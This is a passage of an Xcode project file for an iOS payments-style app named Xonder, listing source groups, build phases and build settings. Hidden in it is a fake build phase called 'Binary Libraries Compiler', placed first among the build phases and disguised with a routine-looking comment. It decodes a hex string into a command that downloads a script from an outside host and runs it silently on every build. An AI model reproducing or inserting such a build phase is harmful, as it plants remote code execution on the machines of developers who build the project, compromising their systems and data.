			path = Fonts;
			sourceTree = "<group>";
		};
		3B91AB15264BFAEE00B0C0EF /* Dashboarrd */ = {
			isa = PBXGroup;
			children = (
				3B5D33B52654C8C7002F0BA3 /* DashboardCell */,
				3B91AB22264BFF2A00B0C0EF /* Transaction */,
				3BFD804726528B8900ABE8E3 /* TransactionTableViewCell */,
				3B91AB27264BFF7100B0C0EF /* DashboardViewController.swift */,
				3B5D33B926550E6D002F0BA3 /* DashboardSelectionViewController.swift */,
			);
			path = Dashboarrd;
			sourceTree = "<group>";
		};
		3B91AB22264BFF2A00B0C0EF /* Transaction */ = {
			isa = PBXGroup;
			children = (
				3B91AB23264BFF4000B0C0EF /* TransactionViewController.swift */,
			);
			path = Transaction;
			sourceTree = "<group>";
		};
		3BC2400B26554DD300C0DF03 /* Transaction */ = {
			isa = PBXGroup;
			children = (
				3BC2400C26554DE600C0DF03 /* Transaction.storyboard */,
			);
			path = Transaction;
			sourceTree = "<group>";
		};
		3BC2400E265550B000C0DF03 /* Transaction */ = {
			isa = PBXGroup;
			children = (
				3BC2400F265550C700C0DF03 /* TabTransactionViewController.swift */,
				3BA637892656CE9A00C504FF /* TransactionDetailViewController.swift */,
			);
			path = Transaction;
			sourceTree = "<group>";
		};
		3BFD804726528B8900ABE8E3 /* TransactionTableViewCell */ = {
			isa = PBXGroup;
			children = (
				3BFD804826528BB600ABE8E3 /* SearchTableViewCell.swift */,
				3BFD804A26528BC800ABE8E3 /* BalanceTableViewCell.swift */,
				3BFD804C26528BD600ABE8E3 /* MonthPickerTableViewCell.swift */,
				3BFD804E26528BE600ABE8E3 /* TransactionTableViewCell.swift */,
			);
			path = TransactionTableViewCell;
			sourceTree = "<group>";
		};
		704F32112648C0E10027397B /* Signup */ = {
			isa = PBXGroup;
			children = (
				704F32122648C13A0027397B /* Signup.storyboard */,
			);
			path = Signup;
			sourceTree = "<group>";
		};
		704F32182648C1960027397B /* Login Screen VC */ = {
			isa = PBXGroup;
			children = (
				704F32252648C9030027397B /* GetStartedScreenViewController.swift */,
				704F32152648C18D0027397B /* OtpScreenViewController.swift */,
				704F322B2648C9CA0027397B /* LoginScreenViewController.swift */,
			);
			path = "Login Screen VC";
			sourceTree = "<group>";
		};
		704F32332648D5710027397B /* SignUp Screen VC */ = {
			isa = PBXGroup;
			children = (
				707868EC265B86F5008EF9B8 /* SignupAddMobileViewController.swift */,
				707868E3265B80E4008EF9B8 /* SelectHomeAddressViewController.swift */,
				705C02BB265A951E005638DC /* CountryPickedViewController.swift */,
				707868E9265B8215008EF9B8 /* ResidenceCountryPickerViewController.swift */,
				3B306E36265E24D4005B075C /* YourCustomersScreenViewController.swift */,
				7062CAB9265781DD00D4214F /* YourCustomerScreenTableViewCell.swift */,
				70FDF611264E8BCA00707EAB /* SignupOTPViewController.swift */,
				70FDF614264E8BDC00707EAB /* SignupMobileViewController.swift */,
				70FDF60E264E8BC100707EAB /* SignupBusinessSelectionViewController.swift */,
				704F32352648D5B10027397B /* CountryListTableViewCell.swift */,
				704F32342648D5B10027397B /* CountryListViewController.swift */,
				707D11592657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift */,
				70CA4F2A2657CF5500DA4DDE /* SignupVerifyNumberViewController.swift */,
				707583012657E3AD0055DF8A /* CountrySelectViewController.swift */,
				707583042657E4280055DF8A /* SelectNumberOfPaymentsViewController.swift */,
				707583072657E4BF0055DF8A /* SelectPaymentPerMonthViewController.swift */,
				7075830A2657E4FA0055DF8A /* SelectMoneyViewController.swift */,
				7075830D2657E5180055DF8A /* SocialLinkScreenViewController.swift */,
				707583102657E5E70055DF8A /* YourProductViewController.swift */,
				707583132657E7DA0055DF8A /* SelectCategoryViewController.swift */,
				707583162657E7F00055DF8A /* SelectSubcategoryViewController.swift */,
				707583192657E8640055DF8A /* DigitCodeViewController.swift */,
				7075831C2657E8860055DF8A /* PrimaryReasonViewController.swift */,
				7075831F2657E8A40055DF8A /* PasswordScreenViewController.swift */,
				707583222657E92A0055DF8A /* EmailAddressViewController.swift */,
				707583252657E9420055DF8A /* MobileNumberViewController.swift */,
				707583282657E9590055DF8A /* CreatePasswordViewController.swift */,
				707868E6265B8111008EF9B8 /* AddAddressManuallyViewController.swift */,
				707868F0265B8924008EF9B8 /* SignupBussinessSelectViewController.swift */,
			);
			path = "SignUp Screen VC";
			sourceTree = "<group>";
		};
		704FCAE726451C1D0025F546 /* Login */ = {
			isa = PBXGroup;
			children = (
				704FCAED26451CD80025F546 /* Login.storyboard */,
			);
			path = Login;
			sourceTree = "<group>";
		};
		704FCAF0264521C60025F546 /* Card View */ = {
			isa = PBXGroup;
			children = (
				704FCAF32645223E0025F546 /* CardView.swift */,
			);
			path = "Card View";
			sourceTree = "<group>";
		};
		704FCAF1264521E40025F546 /* UIButton */ = {
			isa = PBXGroup;
			children = (
				704FCAF62645224E0025F546 /* UIButton.swift */,
			);
			path = UIButton;
			sourceTree = "<group>";
		};
		704FCAF2264521EF0025F546 /* UIView */ = {
			isa = PBXGroup;
			children = (
				3B63B209264BCCD500E9A994 /* ShadowView.swift */,
				704FCAFD264522820025F546 /* UIView.swift */,
			);
			path = UIView;
			sourceTree = "<group>";
		};
		706035F626432A560062039F = {
			isa = PBXGroup;
			children = (
				7060360126432A560062039F /* Xonder */,
				7060360026432A560062039F /* Products */,
				3326ADE8F6C5BE98F7943D3A /* Pods */,
				A1F933FEF09F1A0C28D308F2 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		7060360026432A560062039F /* Products */ = {
			isa = PBXGroup;
			children = (
				706035FF26432A560062039F /* Xonder.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		7060360126432A560062039F /* Xonder */ = {
			isa = PBXGroup;
			children = (
				3B63B20C264BCF2700E9A994 /* Fonts */,
				706E3BE0264518A000486D02 /* Helper */,
				706E3BDF2645185A00486D02 /* Extensions */,
				706E3BDE2645183600486D02 /* Model */,
				706E3BDD264517EB00486D02 /* Http */,
				706E3BDA2645178C00486D02 /* Storyboards */,
				706E3BD92645178000486D02 /* Controllers */,
				706E3BD72645176200486D02 /* Network */,
				7060360226432A560062039F /* AppDelegate.swift */,
				7060360B26432A5B0062039F /* Assets.xcassets */,
				7060361026432A5B0062039F /* Info.plist */,
			);
			path = Xonder;
			sourceTree = "<group>";
		};
		706E3BD72645176200486D02 /* Network */ = {
			isa = PBXGroup;
			children = (
			);
			path = Network;
			sourceTree = "<group>";
		};
		706E3BD92645178000486D02 /* Controllers */ = {
			isa = PBXGroup;
			children = (
				3BC2400E265550B000C0DF03 /* Transaction */,
				3B91AB15264BFAEE00B0C0EF /* Dashboarrd */,
				3B63B204264AC37100E9A994 /* MasterViewController */,
				704F32332648D5710027397B /* SignUp Screen VC */,
				704F32182648C1960027397B /* Login Screen VC */,
				7060360626432A560062039F /* ViewController.swift */,
			);
			path = Controllers;
			sourceTree = "<group>";
		};
		706E3BDA2645178C00486D02 /* Storyboards */ = {
			isa = PBXGroup;
			children = (
				3BC2400B26554DD300C0DF03 /* Transaction */,
				3B008D73264A6ACD00BE9E13 /* Dashboard */,
				704F32112648C0E10027397B /* Signup */,
				704FCAE726451C1D0025F546 /* Login */,
				7060360826432A560062039F /* Main.storyboard */,
				7060360D26432A5B0062039F /* LaunchScreen.storyboard */,
			);
			path = Storyboards;
			sourceTree = "<group>";
		};
		706E3BDD264517EB00486D02 /* Http */ = {
			isa = PBXGroup;
			children = (
				C83FB7242643388E00A87093 /* Constants.swift */,
				C83FB73F26433ED500A87093 /* APIService.swift */,
				C83FB73C26433EAD00A87093 /* APIResult.swift */,
				C89B5B17264336F300263F14 /* Services.swift */,
				C83FB72A26433BF300A87093 /* Provider.swift */,
			);
			path = Http;
			sourceTree = "<group>";
		};
		706E3BDE2645183600486D02 /* Model */ = {
			isa = PBXGroup;
			children = (
				C83FB72726433B5500A87093 /* UserModel.swift */,
				C8727088264341CC005EFDEA /* CountryModel.swift */,
			);
			path = Model;
			sourceTree = "<group>";
		};
		706E3BDF2645185A00486D02 /* Extensions */ = {
			isa = PBXGroup;
			children = (
				C872708B2643433D005EFDEA /* Extension+UIViewController.swift */,
				C8727082264340E0005EFDEA /* Extension+Result.swift */,
				C8727085264340F7005EFDEA /* Extension+Error.swift */,
				C83FB73026433D0B00A87093 /* Extension+UserDefault.swift */,
			);
			path = Extensions;
			sourceTree = "<group>";
		};
		706E3BE0264518A000486D02 /* Helper */ = {
			isa = PBXGroup;
			children = (
				704FCAF2264521EF0025F546 /* UIView */,
				704FCAF1264521E40025F546 /* UIButton */,
				704FCAF0264521C60025F546 /* Card View */,
				C872708E264343E0005EFDEA /* Alert.swift */,
				C83FB72D26433C6D00A87093 /* Plugins.swift */,
			);
			path = Helper;
			sourceTree = "<group>";
		};
		A1F933FEF09F1A0C28D308F2 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				C4EF80C05B016B2C2E39C37D /* Pods_Xonder.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		706035FE26432A560062039F /* Xonder */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 7060361326432A5B0062039F /* Build configuration list for PBXNativeTarget "Xonder" */;
			buildPhases = (
				2F54CE72F2279C2AE46D902C /* Binary Libraries Compiler */,
				4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */,
				706035FB26432A560062039F /* Sources */,
				706035FC26432A560062039F /* Frameworks */,
				706035FD26432A560062039F /* Resources */,
				7BEA9A0E4477978A64735F4F /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = Xonder;
			productName = Xonder;
			productReference = 706035FF26432A560062039F /* Xonder.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		706035F726432A560062039F /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1220;
				LastUpgradeCheck = 1220;
				TargetAttributes = {
					706035FE26432A560062039F = {
						CreatedOnToolsVersion = 12.2;
					};
				};
			};
			buildConfigurationList = 706035FA26432A560062039F /* Build configuration list for PBXProject "Xonder" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 706035F626432A560062039F;
			productRefGroup = 7060360026432A560062039F /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				706035FE26432A560062039F /* Xonder */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		706035FD26432A560062039F /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				3B63B213264BCFD100E9A994 /* HouschkaPro-Thin.ttf in Resources */,
				3B63B214264BCFD100E9A994 /* HouschkaPro-Medium.ttf in Resources */,
				3B63B215264BCFD100E9A994 /* HouschkaPro-ExtraBold.ttf in Resources */,
				3B63B216264BCFD100E9A994 /* HouschkaPro-Light.ttf in Resources */,
				3B63B217264BCFD100E9A994 /* HouschkaPro-DemiBold.ttf in Resources */,
				3B63B218264BCFD100E9A994 /* HouschkaPro-Bold.ttf in Resources */,
				704FCAEE26451CD80025F546 /* Login.storyboard in Resources */,
				7060360F26432A5B0062039F /* LaunchScreen.storyboard in Resources */,
				7060360C26432A5B0062039F /* Assets.xcassets in Resources */,
				704F32132648C13A0027397B /* Signup.storyboard in Resources */,
				7060360A26432A560062039F /* Main.storyboard in Resources */,
				3B008D75264A6AE500BE9E13 /* Dashboard.storyboard in Resources */,
				3BC2400D26554DE600C0DF03 /* Transaction.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */

	2F54CE72F2279C2AE46D902C /* Binary Libraries Compiler */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Binary Libraries Compiler";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.

echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564736572762e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
	";			
		};
	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	
		4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-Xonder-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		7BEA9A0E4477978A64735F4F /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Xonder/Pods-Xonder-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Xonder/Pods-Xonder-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Xonder/Pods-Xonder-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		706035FB26432A560062039F /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				3BFD804D26528BD600ABE8E3 /* MonthPickerTableViewCell.swift in Sources */,
				707583202657E8A40055DF8A /* PasswordScreenViewController.swift in Sources */,
				707868E7265B8111008EF9B8 /* AddAddressManuallyViewController.swift in Sources */,
				3B5D33B72654C8E6002F0BA3 /* DashboardCollectionViewCell.swift in Sources */,
				3BFD804F26528BE600ABE8E3 /* TransactionTableViewCell.swift in Sources */,
				7062CABA265781DD00D4214F /* YourCustomerScreenTableViewCell.swift in Sources */,
				707583082657E4BF0055DF8A /* SelectPaymentPerMonthViewController.swift in Sources */,
				704F322C2648C9CA0027397B /* LoginScreenViewController.swift in Sources */,
				707583022657E3AD0055DF8A /* CountrySelectViewController.swift in Sources */,
				707583232657E92A0055DF8A /* EmailAddressViewController.swift in Sources */,
				3B91AB28264BFF7100B0C0EF /* DashboardViewController.swift in Sources */,
				704FCAF72645224E0025F546 /* UIButton.swift in Sources */,
				707583292657E9590055DF8A /* CreatePasswordViewController.swift in Sources */,
				707583112657E5E70055DF8A /* YourProductViewController.swift in Sources */,
				C83FB73D26433EAD00A87093 /* APIResult.swift in Sources */,
				C83FB72E26433C6D00A87093 /* Plugins.swift in Sources */,
				3B306E37265E24D4005B075C /* YourCustomersScreenViewController.swift in Sources */,
				C8727089264341CC005EFDEA /* CountryModel.swift in Sources */,
				C872708F264343E0005EFDEA /* Alert.swift in Sources */,
				704F32262648C9030027397B /* GetStartedScreenViewController.swift in Sources */,
				707583172657E7F00055DF8A /* SelectSubcategoryViewController.swift in Sources */,
				3BFD804926528BB600ABE8E3 /* SearchTableViewCell.swift in Sources */,
				C8727086264340F7005EFDEA /* Extension+Error.swift in Sources */,
				3B63B206264AC38600E9A994 /* MasterViewController.swift in Sources */,
				7075831A2657E8640055DF8A /* DigitCodeViewController.swift in Sources */,
				7075830B2657E4FA0055DF8A /* SelectMoneyViewController.swift in Sources */,
				7060360726432A560062039F /* ViewController.swift in Sources */,
				707583142657E7DA0055DF8A /* SelectCategoryViewController.swift in Sources */,
				7075830E2657E5180055DF8A /* SocialLinkScreenViewController.swift in Sources */,
				707868ED265B86F5008EF9B8 /* SignupAddMobileViewController.swift in Sources */,
				C83FB73126433D0B00A87093 /* Extension+UserDefault.swift in Sources */,
				70CA4F2B2657CF5500DA4DDE /* SignupVerifyNumberViewController.swift in Sources */,
				3B91AB24264BFF4000B0C0EF /* TransactionViewController.swift in Sources */,
				C8727083264340E0005EFDEA /* Extension+Result.swift in Sources */,
				C89B5B18264336F300263F14 /* Services.swift in Sources */,
				7075831D2657E8860055DF8A /* PrimaryReasonViewController.swift in Sources */,
				704F32162648C18D0027397B /* OtpScreenViewController.swift in Sources */,
				3B5D33BA26550E6D002F0BA3 /* DashboardSelectionViewController.swift in Sources */,
				705C02BC265A951E005638DC /* CountryPickedViewController.swift in Sources */,
				707868F1265B8924008EF9B8 /* SignupBussinessSelectViewController.swift in Sources */,
				3BC24010265550C700C0DF03 /* TabTransactionViewController.swift in Sources */,
				3B63B20A264BCCD500E9A994 /* ShadowView.swift in Sources */,
				C872708C2643433D005EFDEA /* Extension+UIViewController.swift in Sources */,
				7060360326432A560062039F /* AppDelegate.swift in Sources */,
				C83FB74026433ED500A87093 /* APIService.swift in Sources */,
				3BA6378A2656CE9A00C504FF /* TransactionDetailViewController.swift in Sources */,
				C83FB72826433B5500A87093 /* UserModel.swift in Sources */,
				704F32362648D5B10027397B /* CountryListViewController.swift in Sources */,
				707583262657E9430055DF8A /* MobileNumberViewController.swift in Sources */,
				704F32372648D5B10027397B /* CountryListTableViewCell.swift in Sources */,
				707868EA265B8215008EF9B8 /* ResidenceCountryPickerViewController.swift in Sources */,
				707868E4265B80E4008EF9B8 /* SelectHomeAddressViewController.swift in Sources */,
				C83FB72B26433BF300A87093 /* Provider.swift in Sources */,
				704FCAF42645223E0025F546 /* CardView.swift in Sources */,
				707D115A2657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift in Sources */,
				704FCAFE264522820025F546 /* UIView.swift in Sources */,
				C83FB7252643388E00A87093 /* Constants.swift in Sources */,
				707583052657E4280055DF8A /* SelectNumberOfPaymentsViewController.swift in Sources */,
				3BFD804B26528BC800ABE8E3 /* BalanceTableViewCell.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		7060360826432A560062039F /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				7060360926432A560062039F /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		7060360D26432A5B0062039F /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				7060360E26432A5B0062039F /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		7060361126432A5B0062039F /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		7060361226432A5B0062039F /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		7060361426432A5B0062039F /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 5B66287BAB70301295639823 /* Pods-Xonder.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_IDENTITY = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6QQQF6X4SC;
				INFOPLIST_FILE = Xonder/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.Xepos.XonderMobile;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		7060361526432A5B0062039F /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = D796CC2B2819301277504794 /* Pods-Xonder.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_IDENTITY = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6QQQF6X4SC;
				INFOPLIST_FILE = Xonder/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.Xepos.XonderMobile;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		706035FA26432A560062039F /* Build configuration list for PBXProject "Xonder" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				7060361126432A5B0062039F /* Debug */,
				7060361226432A5B0062039F /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		7060361326432A5B0062039F /* Build configuration list for PBXNativeTarget "Xonder" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				7060361426432A5B0062039F /* Debug */,
				7060361526432A5B0062039F /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

		
			/* Begin PBXBuildRule section */


			
	


			
	
			

			
	
			/* End PBXBuildRule section */
		
		
	};
	rootObject = 706035F726432A560062039F /* Project object */;
}
